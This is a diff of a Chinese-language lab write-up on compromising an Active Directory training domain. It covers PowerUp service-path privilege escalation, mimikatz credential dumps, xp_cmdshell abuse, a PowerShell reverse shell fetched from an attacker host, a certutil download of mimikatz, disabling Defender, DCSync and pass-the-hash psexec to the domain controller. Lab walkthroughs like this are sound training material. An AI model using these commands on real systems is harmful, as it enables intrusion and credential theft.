@@ -38,9 +38,11 @@ Machine Offensive-DC - Administrator:Password@ OR Passw0rd@
 ## 渗透测试
 
 目前拥有的权限
+
 ![image.png](../../images/offensive-2.png)
 
 给出的工具如下所示
+
 ![image.png](../../images/offensive-3.png)
 
 相关工具说明：
@@ -59,7 +61,8 @@ Machine Offensive-DC - Administrator:Password@ OR Passw0rd@
 ## 提权-寻找脆弱点
 
 首先使用`PowerUp.ps1`脆弱性检查工具调用其中的全部检查模块进行检查，记得把Windows defender关了。
-```
+
+```powershell
 PS C:\Users\Alice\Desktop\tools> powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
 
 [*] Running Invoke-AllChecks
@@ -117,11 +120,12 @@ UnattendPath : C:\Windows\Panther\Unattend.xml
 
 [*] Checking for encrypted application pool and virtual directory passwords...
 ```
+
 得到了如下脆弱性信息：
 
 1. 未加引号的服务路径
 
-```
+```powershell
 ServiceName   : VulnService
 Path          : C:\Program Files\Vuln Service\VulnService.exe
 StartName     : LocalSystem
@@ -130,7 +134,7 @@ AbuseFunction : Write-ServiceBinary -ServiceName 'VulnService' -Path <HijackPath
 
 2. 可能可以被dll劫持的位置
 
-```
+```powershell
 HijackablePath : C:\Users\Alice\AppData\Local\Microsoft\WindowsApps\AbuseFunction：Write-HijackDll -OutputFile 'C:\Users\Alice\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'
 
 C:\Python27\AbuseFunction：Write-HijackDll -OutputFile 'C:\Python27\\wlbsctrl.dll'
@@ -140,20 +144,22 @@ HijackablePath : C:\Python27\Tools\Scripts\AbuseFunction : Write-HijackDll -Outp
 
 3. 容易被攻击的注册表配置
 
-```
+```powershell
 HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\bginfo
 路径：C:\BGinfo\Bginfo.exe /accepteula /ic:\bginfo\bgconfig.bgi /timer:0
 可修改文件：C:\BGinfo\Bginfo.exe
 ```
 
-3. 无人值守的安装文件
+4. 无人值守的安装文件
 
-```
+```powershell
 UnattendPath : C:\Windows\Panther\Unattend.xml
 ```
+
 ## 提权-尝试提权
 未加引号的服务路径提权：这是利用没有有正确处理引用的全路径名来造成提权。
-```
+
+```powershell
 PS C:\Users\Alice\Desktop\tools> icacls "C:\Program Files\Vuln Service\VulnService.exe.bak"
 C:\Program Files\Vuln Service\VulnService.exe.bak NT AUTHORITY\SYSTEM:(I)(F)
                                                   BUILTIN\Administrators:(I)(F)
@@ -164,7 +170,9 @@ C:\Program Files\Vuln Service\VulnService.exe.bak NT AUTHORITY\SYSTEM:(I)(F)
 
 Successfully processed 1 files; Failed processing 0 files
 ```
+
 说明：F表示完全控制，M表示修改，CI表示从属容器将继承访问控制项。，也就是此处`offensive\Alice`完全控制该文件。
+
 ```
 PS C:\Users\Alice\Desktop\tools> powershell -exec bypass -Command "Import-Module .\PowerUp.ps1;Write-ServiceBinary -ServiceName 'VulnService' -UserName 'offensive\Alice' -Password 'admin@123'"
 
@@ -196,13 +204,17 @@ d-----        8/31/2019   3:01 AM                PowerUpSQL
 -a----         4/6/2019   2:05 AM         750994 powerview.ps1
 -a----        9/20/2023   4:22 AM          22016 service.exe
 ```
+
 运行完上面的命令后发现文件夹内多了一个`service.exe`的文件，将其重命名替换掉`VulnService.exe`，然后启动VulnService服务即可。
-```
+
+```powershell
 cp service.exe "C:\Program Files\Vuln Service\VulnService.exe"
 sc qc VulnService
 ```
+
 这是未添加之前的administrators管理员组的成员
-```
+
+```powershell
 PS C:\Users\Alice\Desktop\tools> net localgroup administrators
 Alias name     administrators
 Comment        Administrators have complete and unrestricted access to the computer/domain
@@ -228,8 +240,10 @@ offensive\Alice
 offensive\Domain Admins
 The command completed successfully.
 ```
+
 抓取密码
-```
+
+```bash
 mimikatz # sekurlsa::logonpasswords
 
 Authentication Id : 0 ; 284856 (00000000:000458b8)
@@ -468,14 +482,18 @@ SID               : S-1-5-18
         ssp :
         credman :
 ```
+
 提取关键信息：
+
 ```
 CLIENT1$:c80cdf882f4efbfbfd9ef36f20e3e145
 offensive\Alice:admin@123
 offensive\Alice:579da618cfbfa85247acf1f800a280a4
 ```
+
 PowerView的模块
-```
+
+```powershell
 Get-NetDomain               #查看域名称
 Get-NetDomainController     #获取域控的信息
 Get-NetForest               #查看域内详细的信息
@@ -505,8 +523,10 @@ Invoke-EnumerateLocalAdmin  #枚举出本地的管理员信息
 Invoke-ProcessHunter        #判断当前机器哪些进程有管理员权限
 Invoke-UserEventHunter    #根据用户日志获取某域用户登陆过哪些域机器
 ```
+
 查询到以下的信息
-```
+
+```powershell
 域控：
 dc.offensive.local => 192.168.159.200
 域成员机：
@@ -519,9 +539,10 @@ dbadmin 	   S-1-5-21-1187620287-4058297830-2395299116-1105
 Alice	S-1-5-21-1187620287-4058297830-2395299116-1103
 dbuser1	S-1-5-21-1187620287-4058297830-2395299116-1104
 ```
+
 ## 横向渗透-发现域中的SQL server实例
 
-```
+```powershell
 PS C:\Users\Alice\Desktop\tools\PowerUpSQL>  powershell -exec bypass -Command "Import-Module .\PowerUpsQL.ps1; Get-SQLInstanceDomain"
 
 
@@ -580,7 +601,7 @@ Description      :
 
 列出数据库访问实例，以及实例是否可以访问，"Accessible"表示连接是可访问的
 
-```
+```powershell
 PS C:\Users\Alice\Desktop\tools\PowerUpSQL> powershell -exec bypass -Command "Import-Module .\PowerUpsQL.ps1; Get-SQLInstanceDomain | Get-SQLConnectionTest"
 
 ComputerName                   Instance                                  Status
@@ -596,7 +617,7 @@ Offensive-SQL1                 Offensive-SQL1,1433                       Accessi
 
 获取更详细的数据库信息
 
-```
+```powershell
 PS C:\Users\Alice\Desktop\tools\PowerUpSQL> powershell -exec bypass -Command "Import-Module .\PowerUpsQL.ps1; Get-SQLServerInfo -Instance Offensive-SQL1"
 
 
@@ -622,11 +643,12 @@ IsSysadmin             : Yes
 ActiveSessions         : 1
 
 ```
+
 通过`Currentlogin`可发现Offensive-SQL1当前的登录用户为：Alice
 
 ## 横向渗透-扫描该数据库服务可能出现的问题
 
-```
+```powershell
 PS C:\Users\Alice\Desktop\tools\PowerUpSQL> powershell -exec bypass -Command "Import-Module .\PowerUpsQL.ps1; Invoke-SQLAudit -Instance Offensive-SQL1 -verbose"
 VERBOSE: LOADING VULNERABILITY CHECKS.
 VERBOSE: RUNNING VULNERABILITY CHECKS.
@@ -818,6 +840,7 @@ Details       : The public principal has EXECUTE privileges on xp_fileexist proc
 Reference     : https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/
 Author        : Scott Sutherland (@_nullbind), NetSPI 2016
 ```
+
 通过阅读`Vulnerability`发现存在可利用的脆弱点：`Excessive Privilege - Execute xp_dirtree`
 
 ## 横向渗透-xp_dirtree 列出主机中的文件
@@ -847,7 +870,7 @@ xp_dirtree 'c:\', 1, 1
 
 开启`xp_cmdshell`
 
-```
+```bash
 EXEC sp_configure 'show advanced options',1
 RECONFIGURE
 EXEC sp_configure 'xp_cmdshell',1
@@ -863,7 +886,7 @@ EXEC master..xp_cmdshell 'whoami'
 
 `offensive\Alice`将Powercat打开监听
 
-```
+```powershell
 Import-Module .\powercat.ps1
 powercat -l -v -p 443
 ```
@@ -874,7 +897,7 @@ powercat -l -v -p 443
 
 在`Heidi.exe`中运行
 
-```
+```bash
 EXEC master..xp_cmdshell 'powershell "iex(New-Object Net.WebClient).DownloadString(''http://192.168.159.10/Invoke-PowerShellTcpOneLine_443.ps1'')"'
 ```
 
@@ -887,20 +910,20 @@ shell接收成功
 
 关闭Windows Defender
 
-```
+```bash
 Set-MpPreference-disablerealtimeMonitoring $true
 ```
 
 将mimikatz添加进HFS，然后下载并运行
 
-```
+```bash
 certutil -urlcache -f -split http://192.168.159.10/mimikatz.exe 
 mimikatz.exe .\mimikatz.exe"privilege::debug" "sekurlsa::logonpasswords" exit
 ```
 
 获取到的密码
 
-```
+```powershell
 PS C:\Windows\system32> certutil -urlcache -f -split http://192.168.159.10/mimikatz.exe
 ****  Online  ****
   000000  ...
@@ -1231,7 +1254,7 @@ offensive\OFFENSIVE-SQL1$:59ab3dfeddfacedcd7d2704188718ad3
 
 其实刚刚在powershell里就可以获取了，但是我忘了，在这里补上吧。
 
-```
+```bash
 mimikatz # lsadump::dcsync /domain:offensive.local /all /csv
 [DC] 'offensive.local' will be the domain
 [DC] 'dc.offensive.local' will be the DC server
@@ -1251,7 +1274,7 @@ mimikatz # lsadump::dcsync /domain:offensive.local /all /csv
 
 直接PSEcex上线域控，收工
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Desktop/impacket/examples]
 └─$ python3 psexec.py -hashes :c456c606a647ef44b646c44a227917a4 offensive/administrator@192.168.159.200 
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
